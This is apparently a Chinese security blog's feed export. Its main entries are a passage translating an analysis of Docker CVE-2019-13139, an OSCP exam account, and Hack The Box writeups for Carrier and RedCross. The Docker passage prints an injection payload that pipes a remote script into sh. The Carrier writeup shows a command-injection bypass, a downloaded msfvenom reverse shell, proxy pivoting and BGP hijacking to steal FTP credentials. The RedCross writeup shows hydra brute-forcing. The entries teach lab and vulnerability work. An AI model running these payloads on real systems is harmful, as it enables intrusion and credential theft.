唯一的缺点是：它的使用“在另一端执行命令”，也就是在服务端。这也是当 git 链接为 http:// 或 https:// 时被忽略的原因。幸运的是 Docker build 运行 git 链接以 git@ 的方式提供。git@ 经常被看作是用户通过 SSH 使用 git 进行克隆，但是如果提供的链接包含“:”，更简洁的：git@remote.server.name:owenr/repo.git。当没有":"的时候，git 将解析链接为一个本地路径。因为它是一个本地路径，提供的 --upload-pack 最终将被用作 git fetch-pack 执行的二进制文件。
<br>

<p>因此，所有思路连成一线，可以构造一条导致命令执行的链接了：<br><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build &quot;git@g.com/a/b#--upload-pack=sleep 30;:&quot;</span><br></pre></td></tr></table></figure>

<br>
将执行下列的步骤：
<br>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git init</span><br><span class="line"></span><br><span class="line">$ git remote add git@g.com/a/b</span><br><span class="line"></span><br><span class="line">$ git fetch origin &quot;--upload-pack=sleep 30; git@g.com/a/b&quot;</span><br></pre></td></tr></table></figure>

<br>

<p>注意远程已附加到 –upload-pack 命令中因此需要使用分号”:”去关闭命令，否则 <a href="mailto:git@g.com" target="_blank" rel="noopener">git@g.com</a>/a/b 将会把 sleep 命令 解析为第二个参数。没有这个分号，你可以看到”sleep: invalid time interval ‘git@g.com/a/b.git(注原文为gcom，译者通过上下文认为作者在此处少打了一个点，对于此处的理解无关大雅)”：<br><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker build &quot;git@gcom/a/b.git#--upload-pack=sleep 5:&quot;</span><br><span class="line"></span><br><span class="line">unable to prepare context: unable to &apos;git clone&apos; to temporary context directory: error fetching: sleep: invalid time interval ‘git@gcom/a/b.git’</span><br><span class="line"></span><br><span class="line">Try &apos;sleep --help&apos; for more information.</span><br></pre></td></tr></table></figure>

<br>
可以进一步采用并转换为正确的命令执行(添加 # 来清除输出，以便 curl 命令不显示)：
<br>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build &quot;git@github.com/meh/meh#--upload-pack=curl -s sploit.conch.cloud/pew.sh|sh;#:&quot;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://staaldraad.github.io/assets/docker-cve-2019-13139.png" alt="Command Execution" title class>
                <p>Command Execution</p>
            </figure>

<p>命令执行</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>这可能是在攻击者可以控制发布到 docker build 的 build 路径的 build 环境中的“远程”命令执行问题。通常的 docker build . -t my-container 模式不会受到影响，大多数 Docker 的用户也不应该会受到此问题的影响。</p>
<br>

<p>在二月份向 Docker 报告，并且在三月底的 18.09.4 的更新中部署了补丁。确保你的 Docker 引擎是最新的，如果可能请避免使用远程环境进行 builds，特别是在第三方提供的情况下。</p>
]]></content>
      
        <categories>
            
            <category> Translation </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一把梭了OSCP后的思考]]></title>
      <url>/2019/07/10/%E4%B8%80%E6%8A%8A%E6%A2%AD%E4%BA%86OSCP%E5%90%8E%E7%9A%84%E6%80%9D%E8%80%83/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Author：B1ngDa0</p>
</blockquote>
<p>本文是记录在一次通过OSCP后对考试的一些思考包括我是怎么考的、建议、必须注意的坑点、和吐槽点，关于OSCP介绍的文章有很多，就不再赘述什么是OSCP了。</p>
<hr>
<h2 id="个人历程"><a href="#个人历程" class="headerlink" title="个人历程"></a>个人历程</h2><h3 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h3><ul>
<li>4月末：报名</li>
<li>5月中旬：实验室开启，约考</li>
<li>6月末：参加考试，并一次获得证书</li>
</ul>
<p>在实验室开启后，过了一遍官方教材之后，<del>打下几台lab就没有继续练习，也没有在其他平台练习</del>，不建议像我这样做，请勿参考。</p>
<p>6月23日早上7点正式考试，调整了作息6点左右醒来，等到6点45使用官方的屏幕显示以及摄像头连接，无误后，7点整会收到考试的信息，OENPVPN的连接文件、目标机器、控制面板等</p>
<p>考试过程中，可随时与监考人员提出需要休息、吃饭等，比较自由，监考人员只有屏幕以及摄像头的信息，不会监控声音或其他。</p>
<p>一边记录一边做题到晚上的时候就已经拿到了25+20+10+10+10 75分了 已经过了<br>有两道题是没提到最高权限，由于官方没有明确指出local.txt以及user权限的分数，所以一直奋战到凌晨4点，想提下一台，更为稳妥。结果并没有成功，最后分数停格在75。</p>
<p>在考试结束后的24小时是上传报告的时间</p>
<ul>
<li>Your exam is in PDF format</li>
<li>Your PDF has been archived into a password-protected .7z file</li>
<li>You used your OSID as part of the name of your .7z file</li>
<li>You have uploaded your .7z file to <a href="https://upload.offsec.com" target="_blank" rel="noopener">https://upload.offsec.com</a></li>
<li>You have emailed the link from the upload page to “oscp AT offensive-security DOT com”</li>
</ul>
<p>比起实打实的拿flag实战环节，写报告环节是很多人的丢分点所在，可能你拿下所有的权限以及flag但是由于报告，可能还是会获得0分。将在建议以及坑点详细讲述。</p>
<hr>
<h3 id="建议一-可选任务"><a href="#建议一-可选任务" class="headerlink" title="建议一 可选任务"></a>建议一 可选任务</h3><p>offsec会告诉你提交教材PDF每章节的练习报告，以及十台或十台以上的lab机器练习报告，可以获得考试分5分，建议大家完成这个可选任务，对通过考试会更为稳妥，考试是很容易出现65分差5分才能过的情况。</p>
<hr>
<h3 id="建议二-思维转换"><a href="#建议二-思维转换" class="headerlink" title="建议二 思维转换"></a>建议二 思维转换</h3><p>我在报考之后没有进行太多的练习，是因为在年初的时候就经常打hackthebox，对靶机使用的套路已经较为熟悉，就只等着兵来将挡水来土掩。</p>
<p>大家在练习的时候，不是为了多刷题遇到原题，而是一个思维的转换，知道它会怎么出题，比如看了端口信息、网站内容后知道漏洞会出在哪里。</p>
<p>有朋友在练习的时候使用实战渗透的思路去做题，反而碰到了兔子洞，如果是在考试的时候遇到兔子洞并且陷进去，是很浪费时间以及影响心态的。</p>
<hr>
<h3 id="建议三-时间安排"><a href="#建议三-时间安排" class="headerlink" title="建议三 时间安排"></a>建议三 时间安排</h3><p>建议约考的时间是一天的开始，充足的休息睡眠后能有足够的精力去更好的做题，比如我早上7点的考试，大不了我就是坚持一天一夜的去做题，如果是晚上或者下午晚点开始的话，做到后面会很容易疲倦。</p>
<h3 id="建议三-详细记录"><a href="#建议三-详细记录" class="headerlink" title="建议三 详细记录"></a>建议三 详细记录</h3><p>官方是明确指出需要以下证明：</p>
<ul>
<li><p>Exploit 代码</p>
<ol>
<li>修改后的代码</li>
<li>代码来源地址</li>
<li>生成shellcode的命令</li>
<li>高亮修改过的代码</li>
<li>解释为什么做出这些改变</li>
</ol>
</li>
<li><p>成功证明<br>成功的证明就是拿去权限，读取flag文件，根据每个机子的题型不同，会存在user权限和local.txt文件，最高权限：<br>SYSTEM user<br>Administrator user<br>User with Administrator privilege<br>Root</p>
</li>
<li><p>面板提交flag<br><img src="/images/cache/2019070111361c0TIOVy4R.png" alt="image"><br>需要在面板中提交读取到的flag，面板只接收不判断对错，所以复制的时候注意是否缺少。</p>
</li>
<li><p>截屏<br>截屏不仅是需要最终读取flag的界面，可以详细的记录每一步的操作与命令反馈<br><img src="/images/cache/201907011136PnMuiOocTr.png" alt="image"></p>
<p>  提供以下两个命令方便最终截图：<br>  linux结果答案截图：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname &amp;&amp; whoami &amp;&amp; cat proof.txt &amp;&amp; /sbin/ifconfig</span><br></pre></td></tr></table></figure>

<p>  windows结果答案截图：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname &amp;&amp; whoami.exe &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</span><br></pre></td></tr></table></figure>

<p>请在考试的时候将每一步详细截图，并简单的写下备注，方便考完试后详细书写报告。</p>
</li>
</ul>
<hr>
<h3 id="建议四-多理解官方考试指南"><a href="#建议四-多理解官方考试指南" class="headerlink" title="建议四 多理解官方考试指南"></a>建议四 多理解官方考试指南</h3><p><a href="https://support.offensive-security.com/oscp-exam-guide/" target="_blank" rel="noopener">https://support.offensive-security.com/oscp-exam-guide/</a></p>
<hr>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>在此很感谢OSCP微信群的先驱们，他们在考试之前给予我很多帮助，将很多很重要的坑点告诉了我，使得我没有踩到太多的坑以至于被扣分。</p>
<h3 id="坑点一-不要使用以下软件版本"><a href="#坑点一-不要使用以下软件版本" class="headerlink" title="坑点一 不要使用以下软件版本"></a>坑点一 不要使用以下软件版本</h3><blockquote>
<p>Spoofing (IP, ARP, DNS, NBNS, etc)<br>Commercial tools or services (Metasploit Pro, Burp Pro, etc.)<br>Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.)<br>Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.)<br>Features in other tools that utilize either forbidden or restricted exam limitations</p>
</blockquote>
<h3 id="坑点二-注意msf的攻击限制"><a href="#坑点二-注意msf的攻击限制" class="headerlink" title="坑点二 注意msf的攻击限制"></a>坑点二 注意msf的攻击限制</h3><p>对于您选择的单个目标机器，您只能使用metasploit模块（辅助、利用和发布）或meterpreter有效负载。一旦选择了一台目标机器，就不能对任何其他机器使用元sploit模块（辅助、利用或发布）或meterpreter有效负载。</p>
<p>以下可随意对所有机器使用：</p>
<blockquote>
<p>multi handler (aka exploit/multi/handler)<br>msfvenom<br>pattern_create.rb<br>pattern_offset.rb</p>
</blockquote>
<h3 id="坑点三-只能在一台机器上使用一次meterpreter"><a href="#坑点三-只能在一台机器上使用一次meterpreter" class="headerlink" title="坑点三 只能在一台机器上使用一次meterpreter"></a>坑点三 只能在一台机器上使用一次meterpreter</h3><p>可能很多人使用msfvenom后习惯用 meterpreter，请多使用nc获得反弹shell。</p>
<h3 id="坑点四-一定要交互式shell-不要webshell"><a href="#坑点四-一定要交互式shell-不要webshell" class="headerlink" title="坑点四 一定要交互式shell 不要webshell"></a>坑点四 一定要交互式shell 不要webshell</h3><blockquote>
<p>You must provide the contents of the proof files in an interactive shell on the target machine with the type or cat command from their original location. Obtaining the contents of the proof files in any other way will result in zero points for the target machine; this includes any type of web-based shell.</p>
</blockquote>
<p>官方明确指出以如何形式的webshell读取flag都将以零分处理，虽然蚁剑等webshell管理软件，内含交互式shell，但是比较含糊，建议大家进行再次反弹。</p>
<p>有出现获得满分、所有flag但是使用的webshell而没有通过考试的情况，在获取webshell之后可以多走一步，上传反弹shell脚本或上传nc获得反弹交互式shell，offsec不认webshell。</p>
<h3 id="坑点五-获取最高权限后登陆ssh或3389远程桌面"><a href="#坑点五-获取最高权限后登陆ssh或3389远程桌面" class="headerlink" title="坑点五 获取最高权限后登陆ssh或3389远程桌面"></a>坑点五 获取最高权限后登陆ssh或3389远程桌面</h3><p>在获取最高权限之后，可添加管理员权限的账户进行登陆ssh或3389远程桌面，再截图一次flag、ip等。</p>
<h3 id="坑点六-Try-Harder"><a href="#坑点六-Try-Harder" class="headerlink" title="坑点六 Try Harder!"></a>坑点六 Try Harder!</h3><p>24小时与五台机器对抗，真的很刺激，也许会因为兔子洞、没思路抠破脑壳，情绪低落，得分缓慢，但是请调整心态，勇猛屠龙！Try Hader！</p>
<h2 id="槽点"><a href="#槽点" class="headerlink" title="槽点"></a>槽点</h2><p>其实吐槽点并没有太多，OSCP是我考过最惬意的考试，实战是比做选择题来的更刺激。<br>但是始终是个考试，不一定会得满分，在丢分之后，很想知道Why。</p>
<ul>
<li>获得考试报告之后，不管成功与否不能再去测试其他思路</li>
<li>官方不会告诉你为什么没有通过<br>希望后面官方会逐渐解决，给一次、二次、多次没过的同学更多的希望。</li>
</ul>
<hr>
<p>以上就是本人一把梭了OSCP的一点思考，并不是什么深知灼见，只是总结了一点前辈们的告诫、经验，希望备考或者待考的同学能够更好的面对考试，避开坑点。</p>
<h2 id="关于交流"><a href="#关于交流" class="headerlink" title="关于交流"></a>关于交流</h2><p>我们有一个国内最大的oscp的wechat聊天组群，有心的小伙伴可以给我发邮件我拉你进群，群里都是乐于帮助的小伙伴，但是我们杜绝直接剧透交流lab题目，拒绝交流考试题目，只为了共同学习共同进步。B1ngDa0#08sec.org</p>
<p>Try Hader!</p>
<figure class="image-box">
                <img src="/images/cache/201907011221Bopf25D8hb.png" alt="微信图片_20190701121927.png" title class>
                <p>微信图片_20190701121927.png</p>
            </figure>]]></content>
      
        <categories>
            
            <category> 证书 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTB靶机渗透实战Writeup_Carrier]]></title>
      <url>/2019/07/09/HTB%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98Writeup-Carrier/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的一个靶机：Carrier的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章，还望斧正。  </p>
<h1 id="本文涉及知识点"><a href="#本文涉及知识点" class="headerlink" title="本文涉及知识点:"></a>本文涉及知识点:</h1><p>SNMP弱口令public泄露  </p>
<p>Python本地服务器搭建  </p>
<p>命令执行绕过  </p>
<p>MSF结合NMAP进行内网扫描  </p>
<p>BGP前缀劫持  </p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>Carrier靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/155" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/155</a></p>
<p>目标IP: 10.10.10.105(Linux)</p>
<p>本机IP: 10.10.14.3(Kali)</p>
<p>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>NMAP端口扫描</p>
<p>首先使用NMAP对目标进行端口扫描，以确定下一步的操作：</p>
<p><code>nmap -sC -sV -oA Carrier 10.10.10.105</code>  #通过默认脚本扫描获取版本并导出为文件</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/Y9ThKbRC/01.png" alt title class>
                <p></p>
            </figure>

<p><code>nmap -sU -sV -oA test 10.10.10.105</code> #通过udp扫描获取版本并导出为文件</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/Pq3CKt8Z/02.png" alt title class>
                <p></p>
            </figure>

<p> 得知21、80、161端口开放，且161端口SNMP共同体pulic开启</p>
<p>因为是靶机渗透，所以账号爆破的操作不被优先考虑。</p>
<p>对网页进行访问获取更多信息：</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/SxG22LSg/2.png" alt title class>
                <p></p>
            </figure>

<p>只有一个登陆框以及两个错误代码。</p>
<p>进行目录爆破：</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/dVFZVNY7/0.png" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="https://i.postimg.cc/4x440DG1/11111.png" alt title class>
                <p></p>
            </figure>

<p>获得/doc/文件下的</p>
<p>网络拓扑图：</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/m2CFRf0f/3.png" alt title class>
                <p></p>
            </figure>

<p>以及网站系统错误代码文档：</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/xdTkKkqn/4.png" alt title class>
                <p></p>
            </figure>



<p>得知：网站使用默认的用户名admin以及密码序列号，我们访问的网页处于AS100机器中，AS200有FTP服务，AS300进行FTP连接操作。</p>
<p>没有发现其他有用信息，接下来进行161端口的SNMP弱口令pulic的利用：</p>
<p>所需工具：snmpwalk</p>
<p><code>snmpwalk -v 1 -c public 10.10.10.105</code> # -v指定协议版本 -c 指定共同体字符串</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/wv17GShr/5.png" alt title class>
                <p></p>
            </figure>

<p>获得密码NET_45JDX23</p>
<p>利用凭据登录</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/tCQYBv7r/6.png" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="https://i.postimg.cc/sfZM9CfQ/7.png" alt title class>
                <p></p>
            </figure>

<p>得知：10.120.15.0/24网段中存在FTP服务</p>
<p>可在diag.php页面进行命令执行。</p>
<p>## 获取USER权限</p>
<p>使用burpsuite对diag页面数据进行抓取</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/wMJ36L4c/8.png" alt title class>
                <p></p>
            </figure>

<p>命令参数为check,为base64编码，解码为quagga 与页面显示结果符合。</p>
<p>直接将简单的Linux命令进行base64编码并代入参数，发现页面返回空白</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/xTvqhGz9/9.png" alt title class>
                <p></p>
            </figure>

<p>测试最简单的命令绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cXVhZ2dhIHwgbHM=    #quagga | ls</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://i.postimg.cc/3x3WTyXm/10.png" alt title class>
                <p></p>
            </figure>

<p>执行成功可以看到user.txt已经躺着那里了，user.txt目标完成</p>
<h2 id="获取ROOT权限"><a href="#获取ROOT权限" class="headerlink" title="获取ROOT权限"></a>获取ROOT权限</h2><p>已知信息：</p>
<p>目前为root权限但并不是目标主机10.10.10.105的root，目前我们处于网络拓扑图中的AS100主机</p>
<p>为了更详细方便的获取信息，使用msfvenom生成elf文件进行反弹shell至msf上.</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=3333 -f elf &gt; shell.elf</code>  #使用linux/x86/meterpreter/reverse_tcp payload，将shell反弹至10.10.14.3的3333端口，生成之后使用python2中的SimpleHTTPServer模块进行快速搭建http服务</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/3wRRkPbw/12.png" alt title class>
                <p></p>
            </figure>



<p>在命令执行的地方获取并执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.3:8000/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br></pre></td></tr></table></figure>

<p>在本地msf监听3333端口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.3</span><br><span class="line">set LPORT 3333</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://i.postimg.cc/d0x0r4zj/13.png" alt title class>
                <p></p>
            </figure>

<p>在目标机执行./shell.elf </p>
<p>命令执行处较为麻烦就不进行截图了</p>
<p>成功获得反弹shell：</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/SNhx6Xt3/14.png" alt title class>
                <p></p>
            </figure>

<p>接下来需要对目标的网络环境进行详细查探：</p>
<p>添加路由：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set session 1</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://i.postimg.cc/cCQ4qZ6F/16.png" alt title class>
                <p></p>
            </figure>

<p>可以看到网络很复杂并且没有目标ip。</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/76JZVS48/17.png" alt title class>
                <p></p>
            </figure>

<p>route中的ip将通过session 1进行访问</p>
<p>接下来设置SOCKS代理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 1090</span><br><span class="line">run -j</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://i.postimg.cc/j2VdkCqW/18.png" alt title class>
                <p></p>
            </figure>

<p>成功设置后</p>
<p>我们将通过proxychains包 进行代理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br></pre></td></tr></table></figure>

<p>未安装可使用以上命令进行安装</p>
<p>编辑/etc/proxychains.conf 进行配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>添加以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">#add proxy here ...</span><br><span class="line">#meanwile</span><br><span class="line">#defaults set to &quot;tor&quot;</span><br><span class="line">socks4  127.0.0.1 1090</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://i.postimg.cc/9XTfwP1y/19.png" alt title class>
                <p></p>
            </figure>

<p>配置成功，在终端运行proxychains [工具] 将使用代理运行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.120.15.0/24 -p 21,22,23,25,80,443,445,3389,8000,8080</span><br></pre></td></tr></table></figure>

<p>使用nmap扫描10.120.15网段中开启的关键端口</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/fTfTBwGL/20.png" alt title class>
                <p></p>
            </figure>

<p>发现10.120.15.10开放FTP服务</p>
<p>未获取其他有效信息，现在查看之前已控制主机的网络</p>
<p>netstat -pantu</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/tgYqqFYZ/21.png" alt title class>
                <p></p>
            </figure>

<p>有bgp服务的2601端口开放，根据之前得到的信息，我们现在需要进行BGP劫持获得AS200(10.120.15.10) FTP尝试登陆的账号密码</p>
<p>思路：通过修改bgp路由欺骗AS200将数据传输至已控主机。</p>
<p>在已控主机中依次运行以下命令</p>
<p>路由伪造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vtysh</span><br><span class="line">config terminal</span><br><span class="line">router bgp 100</span><br><span class="line">network 10.120.15.0/32</span><br><span class="line">end</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>IP伪造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip address add 10.120.15.10/24 dev eth2</span><br></pre></td></tr></table></figure>

<p>现在10.120.15.10已经将数据源源不断的传至已控主机</p>
<p>为了获得FTP登陆的数据，我们可在已控主机搭建FTP服务</p>
<p>使用以下FTP脚本：</p>
<p>代码较冗长，我已上传至Github:</p>
<p><a href="https://github.com/b1ngda0/FtpServicePython/" target="_blank" rel="noopener">https://github.com/b1ngda0/FtpServicePython/</a></p>
<figure class="image-box">
                <img src="https://i.postimg.cc/wjWxYwTY/22.png" alt title class>
                <p></p>
            </figure>

<p>运行后可以看到已经获取到账号root以及登陆密码</p>
<p>使用ssh进行登录</p>
<figure class="image-box">
                <img src="https://i.postimg.cc/1z29f4qW/23.png" alt title class>
                <p></p>
            </figure>

<p>已经获取root权限以及root.txt</p>
<p>渗透完成！</p>
<h1 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h1><p>文中的bgp劫持类似于arp欺骗，靶机环境为一个网关两台路由器，一台路由器连接一台服务器，服务器接收到消息后先找路由器，我们通过路由伪造，使两台路由器地址一样，又进行了IP伪造，使IP离AS200近，于是AS200将数据传输至已控主机，此时我们使用ftp脚本获取或者进行tcpdump抓包就可以获取数据。</p>
<h1 id="文献参考"><a href="#文献参考" class="headerlink" title="文献参考"></a>文献参考</h1><p>snmap弱口令：</p>
<p><a href="https://blog.csdn.net/archersaber39/article/details/78932252" target="_blank" rel="noopener">https://blog.csdn.net/archersaber39/article/details/78932252</a></p>
<p>msf代理设置nmap扫描：</p>
<p><a href="https://blog.csdn.net/h4ck0ne/article/details/50570749" target="_blank" rel="noopener">https://blog.csdn.net/h4ck0ne/article/details/50570749</a></p>
<p><a href="http://www.blackhillsinfosec.com/use-nmap-meterpreter" target="_blank" rel="noopener">http://www.blackhillsinfosec.com/use-nmap-meterpreter</a></p>
<p>bgp劫持：</p>
<p><a href="https://en.wikipedia.org/wiki/BGP_hijacking" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/BGP_hijacking</a> </p>
<p><a href="https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking" target="_blank" rel="noopener">https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking</a> </p>
<p><a href="https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo" target="_blank" rel="noopener">https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo</a></p>
<p><a href="http://cs.slu.edu/~espositof/teaching/4650/lab3/" target="_blank" rel="noopener">http://cs.slu.edu/~espositof/teaching/4650/lab3/</a></p>
]]></content>
      
        <categories>
            
            <category> HTB靶机渗透实战Writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶机writeup </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第一篇博客]]></title>
      <url>/2019/07/09/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>Hello world</p>
]]></content>
      
        
        <tags>
            
            <tag> B1ngDa0 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTB靶机渗透实战Writeup_RedCross]]></title>
      <url>/2019/07/08/HTB%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98Writeup-RedCross/</url>
      <content type="html"><![CDATA[<figure class="image-box">
                <img src="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" alt title class>
                <p></p>
            </figure>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的靶机：RedCross的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章。</p>
<h1 id="本文涉及知识点"><a href="#本文涉及知识点" class="headerlink" title="本文涉及知识点:"></a>本文涉及知识点:</h1><p>hydra爆破web登录<br>sql注入<br>xss获取cookie<br>psql基本操作</p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>RedCross靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/162" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/162</a><br>目标IP: 10.10.10.113(Linux)<br>本机IP:10.10.14.43(Kali)<br>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>NMAP端口扫描<br><code>nmap -sC -sV -oA  nmap 10.10.10.113</code></p>
<figure class="image-box">
                <img src="https://p4.ssl.qhimg.com/t01d95d0c0b6f6c7214.png" alt title class>
                <p></p>
            </figure>
<p>目标主机开放了22、80、443端口，在80、443端口都开放了httpd服务。<br>尝试访问10.10.10.113<br>发现进行了重定向</p>
<figure class="image-box">
                <img src="https://p2.ssl.qhimg.com/t01c08bd1fad617085a.png" alt title class>
                <p></p>
            </figure>
<p>使用curl查看 转向至intra.redcross.htb</p>
<figure class="image-box">
                <img src="https://p0.ssl.qhimg.com/t01fb72e6a1acd16364.png" alt title class>
                <p></p>
            </figure>
<p>添加10.10.10.113 intra.redcross.htb至/etc/hosts<br><code>echo &quot;10.10.10.113 intra.redcross.htb&quot; &gt; /etc/hosts</code><br>成功访问，页面存在登录框，contact页面</p>
<figure class="image-box">
                <img src="https://p0.ssl.qhimg.com/t01d4bfbcd3523ad775.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="https://p4.ssl.qhimg.com/t016ed4fec831a8bf34.png" alt title class>
                <p></p>
            </figure>
<p>登陆框可爆破：</p>
<figure class="image-box">
                <img src="https://p2.ssl.qhimg.com/t01f08b466e8204cf65.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="https://p1.ssl.qhimg.com/t0197198166ad6595e0.png" alt title class>
                <p></p>
            </figure>
<h2 id="账户爆破"><a href="#账户爆破" class="headerlink" title="账户爆破"></a>账户爆破</h2><p>使用hydra进行web登录爆破<code>hydra -L /root/ruokoul/darkweb2017-top1000.txt -P /root/ruokoul/darkweb2017-top1000.txt -s 443 10.10.10.113 https-post-form &quot;/pages/actions.php:user=^USER^&amp;pass=^PASS^&amp;action=login:Wrong&quot;</code><br>(抓包可发现，intra使用的是443端口)<br>爆破得出 guest guest 可进行登录</p>
<figure class="image-box">
                <img src="https://p1.ssl.qhimg.com/t0195f7fc096d5ecebf.png" alt title class>
                <p></p>
